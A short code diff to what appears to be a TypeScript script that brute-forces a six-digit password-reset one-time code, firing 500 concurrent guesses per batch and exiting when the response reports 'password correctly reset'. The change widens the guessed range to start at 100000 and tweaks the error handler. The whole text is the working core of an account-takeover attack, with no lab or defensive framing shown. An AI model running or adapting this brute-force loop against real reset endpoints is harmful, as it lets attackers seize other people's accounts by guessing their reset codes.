@@ -30,7 +30,7 @@ async function SendRequest(otp : string){
 }
 
 async function main(){
-    for(let i= 200000 ; i < 1000000; i+=500){
+    for(let i= 100000 ; i < 1000000; i+=500){
         let promises = [];
         console.log(`starting from ${pad(i)}`);
         for(let j = i; j < i + 500; j++){
@@ -41,7 +41,7 @@ async function main(){
                         console.log("password correctly reset")
                         process.exit(0);
                     }
-            }).catch(e => {}));
+            }).catch(e => {e}));
         await Promise.all(promises);
         }
     }
